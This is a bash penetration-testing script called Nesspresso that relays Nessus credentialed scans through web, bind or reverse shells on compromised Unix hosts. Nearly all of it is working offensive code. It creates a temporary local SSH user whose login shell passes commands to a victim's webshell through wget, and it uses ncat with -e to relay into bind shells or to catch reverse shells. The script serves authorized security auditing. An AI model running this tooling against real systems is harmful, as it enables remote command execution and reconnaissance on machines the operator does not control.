#!/bin/bash

# Nesspresso
# Sash @ Modux 2014
# Run “credentialed” Nessus scans and audits through web, bind and reverse shells
# Currently only for compromised *nix hosts

# Usage: ./nesspresso type
#    type: "web" or "bind" or "reverse"

# This script sets up a local SSH login which Nessus connects to
# The SSH commands are then forwarded through the users login shell to the remote shell on the compromised box

# Works quick and easy with web and bind shells

# For reverse shells you need to specify the port only

#---------#     #---------#     #--------#
#         #     #         #     # Web/   #
# Nessus  # --> # Local   # --> # Bind/  #
#         #     #  SSH    #     # Reverse#
#         #     #   Login #     # Shell  #
#---------#     #---------#     #--------#
mode=$1
function init_vars {


  echo -e "Starting up...\n"

  usage='./nesspresso type\n    type: "web" or "bind" or "reverse"'

  # VARS to setup local SSH user
  username="nessus"
  password=`echo $RANDOM | sha256sum | base64 | head -c 10`

  # VARS for local SSH login shell
  #path="/home/$username/"

  local_shell="/tmp/nessus_shell"

  # VARS for remote victim shell
  host="192.168.61.132" # remote host ip e.g. 192.168.1.1
  port=80

  # WEBSHELL?
  url="webshell.php" # {http://victim/}webshell.php
  httpparam="0" #?exec=ifconfig
  method="http" #http/https

}


function init_req {

  msg=""

  if [[ $EUID -ne 0 ]]; then

    msg="$msg\nYou must be a root user"
  fi

  # Check mode is specified
  if [[ "$mode" != "web" ]] && [[ "$mode" != "bind" ]] && [[ "$mode" != "reverse" ]]; then
    msg="$msg\nPlease specify mode [web/bind/reverse]"
  fi

  # Check that at least port has been configured
  if [ "$port" == "" ]; then
    msg="$msg\nYou need to configure the VARS in this script file"
  fi

  # Exit and clean up
  if [[ $msg != "" ]]; then
    echo -e "$usage"
    echo -e "$msg"
    exit 1
  fi

}


function add_user {

  echo -e "Creating user \"$username\"...\n"

  # Add user and local login shell path
  useradd $username -m -s $local_shell

  # Set password
  echo -e "$password\n$password" | (passwd -q $username 2>/dev/null)

}


function get_webshell {

  #Build shell file and add variables for victim shell from above
  shell_file='#!/bin/bash

# Use to send nessus scans or other remote commands to compromised web server
# Best used with a simple web shell that just outputs the raw command output (without <pre> or other HTML noise)

# Setup variables of host to scan
host='"$host"'
port='"$port"'
url='"$url"'
httpparam='"$httpparam"'
method='"$method"' # http/https

#use with noisey webshells containing HTML...
startmatch='"$start_pattern"'  # unique start string
endmatch='"$endpattern"' # escape special chars properly for use with sed

# Parse arguments sent from SSH
while getopts ":c:" opt;  do
  case $opt in
    c) cmd="$OPTARG"
    ;;
  esac
done


#request="GET $url?$httpparam=$cvar HTTP/1.1\r\nHost: $host\r\n\r\n"
# Web shell port
response=`wget -qO- "$method://$host:$port/$url?$httpparam=$cmd"`

if [ -z $startmatch ]; then
 echo "$response"
else
  echo "$response" | sed -n "/$startmatch/,/$endmatch/p" | grep -v $startmatch | grep -v $endmatch
fi

  '


  # end
  # SSH login shell
  echo "$shell_file" >  $local_shell

}


function get_shell {

  shell_file='#!/bin/bash

# In order to send commands through a reverse shell set up your listener with the following nc command
# A listener for the reverse shell
# A listener for this file to connect
# ncat -lp 4444 -e "/usr/bin/ncat -lp 6666"

# For direct connect to bind shells

host='"$host"'
port='"$port"'

while getopts ":c:" opt;  do
  case $opt in

    c) cmd="$OPTARG"
    ;;
  esac
done

# Send command through nc
echo $cmd | nc localhost 55455
  '

# end
# SSH login shell

echo "$shell_file" >  "$local_shell"

}


function cleanup {

  echo "Exiting..."
  echo "Killing user processes..."
  killall -u $username 2> /dev/null
  echo "Removing local SSH shell..."
  rm "$local_shell" 2>/dev/null
  echo "Removing user: $username..."
  userdel -r $username 2> /dev/null


}

init_vars

init_req

add_user

case $mode in
  "web" )

    get_webshell
    ;;

  "bind" )

    get_shell

    # setup local persistent forwarder to bind shell (keep open)
    sudo -H -u nessus bash -c 'ncat '"$host"' '"$port"' -e "/usr/bin/ncat -k -lp 55455" ' &
    ;;
  "reverse" )

    get_shell

    sudo -H -u nessus bash -c 'ncat -lp '"$port"' -e "/usr/bin/ncat -klp 55455" ' &
    ;;

  *)
    echo -e "$usage"
    echo "Please specify a shell type"
    cleanup
    exit 1
    ;;
esac


chown $username:$username "$local_shell"
chmod 700 "$local_shell"

trap cleanup EXIT

echo "Waiting for SSH connection from Nessus"
echo ""
echo "Configure Nessus with SSH credentials:"
echo "Target: This machine [eth0: `ifconfig eth0 2>/dev/null|awk '/inet addr:/ {print $2}'|sed 's/addr://'`]"
echo "Username: $username"
echo "Password: $password"
echo ""
read -p "Press RETURN to clean up and exit"
